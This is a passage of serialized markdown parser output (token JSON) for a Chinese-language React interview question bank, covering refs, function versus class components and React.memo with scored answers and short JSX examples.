数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n\\n","task":false,"loose":true,"text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n","tokens":[{"type":"text","raw":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。\\n","text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","tokens":[{"type":"text","raw":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","text":"数据一致性：单向数据流确保了数据的一致性，避免了数据的混乱和不可预测的变化。","escaped":false}]}]},{"type":"list_item","raw":"- 易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n\\n","task":false,"loose":true,"text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n","tokens":[{"type":"text","raw":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。\\n","text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","tokens":[{"type":"text","raw":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","text":"易于调试：数据流的单一方向使得调试更加容易，可以更容易地追踪数据的变化。","escaped":false}]}]},{"type":"list_item","raw":"- 可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","task":false,"loose":true,"text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","tokens":[{"type":"text","raw":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","tokens":[{"type":"text","raw":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","text":"可预测性：单向数据流使得应用的状态变化更加可预测，便于维护和扩展。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. React中的Refs是什么？有哪些使用场景？\\n\\n","depth":2,"text":"12. React中的Refs是什么？有哪些使用场景？","tokens":[{"type":"text","raw":"12. React中的Refs是什么？有哪些使用场景？","text":"12. React中的Refs是什么？有哪些使用场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 创建和使用Refs：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 创建和使用Refs：","task":false,"loose":false,"text":"**1：** 创建和使用Refs：","tokens":[{"type":"text","raw":"**1：** 创建和使用Refs：","text":"**1：** 创建和使用Refs：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 创建和使用Refs：","text":" 创建和使用Refs：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nfunction TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () => {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    <>\\n      <input ref={inputRef} type=\\"text\\" />\\n      <button onClick={focusInput}>Focus Input</button>\\n    </>\\n  );\\n}\\n```","lang":"jsx","text":"function TextInputWithFocusButton() {\\n  const inputRef = useRef(null);\\n\\n  const focusInput = () => {\\n    inputRef.current.focus();\\n  };\\n\\n  return (\\n    <>\\n      <input ref={inputRef} type=\\"text\\" />\\n      <button onClick={focusInput}>Focus Input</button>\\n    </>\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 转发Refs：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 转发Refs：","task":false,"loose":false,"text":"**1：** 转发Refs：","tokens":[{"type":"text","raw":"**1：** 转发Refs：","text":"**1：** 转发Refs：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 转发Refs：","text":" 转发Refs：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst FancyButton = React.forwardRef((props, ref) => (\\n  <button ref={ref} className=\\"fancy-button\\">\\n    {props.children}\\n  </button>\\n));\\n```","lang":"jsx","text":"const FancyButton = React.forwardRef((props, ref) => (\\n  <button ref={ref} className=\\"fancy-button\\">\\n    {props.children}\\n  </button>\\n));"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 常见使用场景：\\n  + 管理焦点、文本选择或媒体播放\\n  + 触发强制动画\\n  + 集成第三方DOM库\\n\\n- **1：** 使用注意事项：\\n  + 避免过度使用Refs\\n  + 不要用Refs来做可以通过声明式实现的事情\\n  + 在类组件中使用需要通过React.createRef()创建","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 常见使用场景：\\n  + 管理焦点、文本选择或媒体播放\\n  + 触发强制动画\\n  + 集成第三方DOM库\\n\\n","task":false,"loose":true,"text":"**1：** 常见使用场景：\\n+ 管理焦点、文本选择或媒体播放\\n+ 触发强制动画\\n+ 集成第三方DOM库\\n","tokens":[{"type":"text","raw":"**1：** 常见使用场景：\\n","text":"**1：** 常见使用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 常见使用场景：","text":" 常见使用场景：","escaped":false}]},{"type":"list","raw":"+ 管理焦点、文本选择或媒体播放\\n+ 触发强制动画\\n+ 集成第三方DOM库\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 管理焦点、文本选择或媒体播放\\n","task":false,"loose":false,"text":"管理焦点、文本选择或媒体播放","tokens":[{"type":"text","raw":"管理焦点、文本选择或媒体播放","text":"管理焦点、文本选择或媒体播放","tokens":[{"type":"text","raw":"管理焦点、文本选择或媒体播放","text":"管理焦点、文本选择或媒体播放","escaped":false}]}]},{"type":"list_item","raw":"+ 触发强制动画\\n","task":false,"loose":false,"text":"触发强制动画","tokens":[{"type":"text","raw":"触发强制动画","text":"触发强制动画","tokens":[{"type":"text","raw":"触发强制动画","text":"触发强制动画","escaped":false}]}]},{"type":"list_item","raw":"+ 集成第三方DOM库","task":false,"loose":false,"text":"集成第三方DOM库","tokens":[{"type":"text","raw":"集成第三方DOM库","text":"集成第三方DOM库","tokens":[{"type":"text","raw":"集成第三方DOM库","text":"集成第三方DOM库","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用注意事项：\\n  + 避免过度使用Refs\\n  + 不要用Refs来做可以通过声明式实现的事情\\n  + 在类组件中使用需要通过React.createRef()创建","task":false,"loose":true,"text":"**1：** 使用注意事项：\\n+ 避免过度使用Refs\\n+ 不要用Refs来做可以通过声明式实现的事情\\n+ 在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"**1：** 使用注意事项：\\n","text":"**1：** 使用注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用注意事项：","text":" 使用注意事项：","escaped":false}]},{"type":"list","raw":"+ 避免过度使用Refs\\n+ 不要用Refs来做可以通过声明式实现的事情\\n+ 在类组件中使用需要通过React.createRef()创建","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免过度使用Refs\\n","task":false,"loose":false,"text":"避免过度使用Refs","tokens":[{"type":"text","raw":"避免过度使用Refs","text":"避免过度使用Refs","tokens":[{"type":"text","raw":"避免过度使用Refs","text":"避免过度使用Refs","escaped":false}]}]},{"type":"list_item","raw":"+ 不要用Refs来做可以通过声明式实现的事情\\n","task":false,"loose":false,"text":"不要用Refs来做可以通过声明式实现的事情","tokens":[{"type":"text","raw":"不要用Refs来做可以通过声明式实现的事情","text":"不要用Refs来做可以通过声明式实现的事情","tokens":[{"type":"text","raw":"不要用Refs来做可以通过声明式实现的事情","text":"不要用Refs来做可以通过声明式实现的事情","escaped":false}]}]},{"type":"list_item","raw":"+ 在类组件中使用需要通过React.createRef()创建","task":false,"loose":false,"text":"在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"在类组件中使用需要通过React.createRef()创建","text":"在类组件中使用需要通过React.createRef()创建","tokens":[{"type":"text","raw":"在类组件中使用需要通过React.createRef()创建","text":"在类组件中使用需要通过React.createRef()创建","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. 什么是函数组件和类组件？它们有什么区别？\\n\\n","depth":2,"text":"13. 什么是函数组件和类组件？它们有什么区别？","tokens":[{"type":"text","raw":"13. 什么是函数组件和类组件？它们有什么区别？","text":"13. 什么是函数组件和类组件？它们有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 函数组件：\\n\\n- 定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n\\n- 优点：代码更简洁，性能更好（因为没有类的开销）。\\n\\n- 限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n\\n- 类组件：\\n\\n- 定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n\\n- 优点：支持生命周期方法和状态管理，功能更强大。\\n\\n- 缺点：代码相对复杂，性能略逊于函数组件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 函数组件：\\n\\n","task":false,"loose":true,"text":"函数组件：\\n","tokens":[{"type":"text","raw":"函数组件：\\n","text":"函数组件：","tokens":[{"type":"text","raw":"函数组件：","text":"函数组件：","escaped":false}]}]},{"type":"list_item","raw":"- 定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n\\n","task":false,"loose":true,"text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n","tokens":[{"type":"text","raw":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。\\n","text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","tokens":[{"type":"text","raw":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","text":"定义：函数组件是一个简单的 JavaScript 函数，接收 props 作为参数，返回 JSX。","escaped":false}]}]},{"type":"list_item","raw":"- 优点：代码更简洁，性能更好（因为没有类的开销）。\\n\\n","task":false,"loose":true,"text":"优点：代码更简洁，性能更好（因为没有类的开销）。\\n","tokens":[{"type":"text","raw":"优点：代码更简洁，性能更好（因为没有类的开销）。\\n","text":"优点：代码更简洁，性能更好（因为没有类的开销）。","tokens":[{"type":"text","raw":"优点：代码更简洁，性能更好（因为没有类的开销）。","text":"优点：代码更简洁，性能更好（因为没有类的开销）。","escaped":false}]}]},{"type":"list_item","raw":"- 限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n\\n","task":false,"loose":true,"text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n","tokens":[{"type":"text","raw":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。\\n","text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","tokens":[{"type":"text","raw":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","text":"限制：早期版本的函数组件不支持生命周期方法和状态管理，但随着 Hooks 的引入，这些限制已经被解除。","escaped":false}]}]},{"type":"list_item","raw":"- 类组件：\\n\\n","task":false,"loose":true,"text":"类组件：\\n","tokens":[{"type":"text","raw":"类组件：\\n","text":"类组件：","tokens":[{"type":"text","raw":"类组件：","text":"类组件：","escaped":false}]}]},{"type":"list_item","raw":"- 定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n\\n","task":false,"loose":true,"text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n","tokens":[{"type":"text","raw":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。\\n","text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","tokens":[{"type":"text","raw":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","text":"定义：类组件是继承自 React.Component 的 ES6 类，可以定义生命周期方法和管理状态。","escaped":false}]}]},{"type":"list_item","raw":"- 优点：支持生命周期方法和状态管理，功能更强大。\\n\\n","task":false,"loose":true,"text":"优点：支持生命周期方法和状态管理，功能更强大。\\n","tokens":[{"type":"text","raw":"优点：支持生命周期方法和状态管理，功能更强大。\\n","text":"优点：支持生命周期方法和状态管理，功能更强大。","tokens":[{"type":"text","raw":"优点：支持生命周期方法和状态管理，功能更强大。","text":"优点：支持生命周期方法和状态管理，功能更强大。","escaped":false}]}]},{"type":"list_item","raw":"- 缺点：代码相对复杂，性能略逊于函数组件。","task":false,"loose":true,"text":"缺点：代码相对复杂，性能略逊于函数组件。","tokens":[{"type":"text","raw":"缺点：代码相对复杂，性能略逊于函数组件。","text":"缺点：代码相对复杂，性能略逊于函数组件。","tokens":[{"type":"text","raw":"缺点：代码相对复杂，性能略逊于函数组件。","text":"缺点：代码相对复杂，性能略逊于函数组件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. React.memo 的作用和使用场景\\n\\n","depth":2,"text":"14. React.memo 的作用和使用场景","tokens":[{"type":"text","raw":"14. React.memo 的作用和使用场景","text":"14. React.memo 的作用和使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。\\n- **1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。\\n- **1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。\\n","task":false,"loose":false,"text":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","tokens":[{"type":"text","raw":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","text":"**1：** 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","text":" 作用1： 性能优化：React.memo 是一个高阶组件，它通过对组件的 props 进行浅比较来决定组件是否需要重新渲染。如果传入组件的 props 没有发生变化，组\\n件就不会重新渲染；只有当 props 发生变化时，组件才会重新渲染。这有助于减少不必要的渲染操作，提高应用程序的性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。\\n","task":false,"loose":false,"text":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","tokens":[{"type":"text","raw":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","text":"**1：** 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","text":" 作用2：避免重复渲染：在 React 应用中，当一个组件的父组件重新渲染时，它默认会导致子组件也重新渲染。对于那些只依赖于 props 且计算成本较高的组件，这\\n种默认行为可能会导致性能浪费。React.memo 可以帮助解决这个问题，它可以让组件 “记住” 之前的渲染结果，在 props 不变的情况下跳过重新渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","task":false,"loose":false,"text":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","text":"**1：** 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","text":" 使用场景1：纯展示组件。纯展示组件是指那些只根据传入的 props 来展示 UI，没有内部状态变化和副作用（如数据获取、订阅事件等）的组件。例如，一个简单的用户\\n信息展示组件，它接收用户的姓名、年龄等信息作为 props，并将这些信息展示出来。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst UserInfo = ({ name, age }) => (\\n    <div>\\n        <p>Name: {name}</p>\\n        <p>Age: {age}</p>\\n    </div>\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst UserInfo = ({ name, age }) => (\\n    <div>\\n        <p>Name: {name}</p>\\n        <p>Age: {age}</p>\\n    </div>\\n);\\nexport default React.memo(UserInfo);\\n//在这个例子中，UserInfo 组件是一个纯展示组件。通过使用 React.memo 包裹它，当组件的 name 和 age props 没有变化时，组件就不会重新渲染，从而提高了性能。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","task":false,"loose":false,"text":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n\\n使这些子组件的 props 并没有实际变化。示例：","text":"**1：** 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","text":" 使用场景2：大型组件树中的子组件。在大型的 React 应用中，组件树可能会非常复杂。在这种情况下，一些深层次的子组件可能会因为父组件的重新渲染而频繁地重新渲染，即\\n使这些子组件的 props 并没有实际变化。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst Sidebar = ({ menuData }) => {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        <div>\\n            {menuData.map((item) => (\\n                <MenuItem key={item.id} item={item} />\\n            ))}\\n        </div>\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。\\n```","lang":"js","text":"import React from \'react\';\\nconst Sidebar = ({ menuData }) => {\\n    // 复杂的菜单渲染逻辑\\n    return (\\n        <div>\\n            {menuData.map((item) => (\\n                <MenuItem key={item.id} item={item} />\\n            ))}\\n        </div>\\n    );\\n};\\nexport default React.memo(Sidebar);\\n//通过使用 React.memo 包裹 Sidebar 组件，当父组件重新渲染但 menuData 没有变化时，Sidebar 组件就不会重新渲染，避免了不必要的渲染开销，提高了整个页面的性能。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","task":false,"loose":false,"text":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","tokens":[{"type":"text","raw":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n\\n必要的渲染。示例：","text":"**1：** 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","text":" 使用场景3：在函数式组件中。如果组件的渲染逻辑比较复杂，或者组件在一个频繁更新的环境中（如在一个实时数据更新的仪表盘应用中），使用 React.memo 可以有效减少不\\n必要的渲染。示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport React from \'react\';\\nconst RealTimeChart = ({ dataArray, chartType }) => {\\n    // 复杂的图表绘制逻辑，可能涉及到数据处理、坐标轴设置等\\n    return (\\n        <div>\\n            <Chart data={dataArray} type={chartType} />\\n        </div>\\n    );\\n};\\nexport default 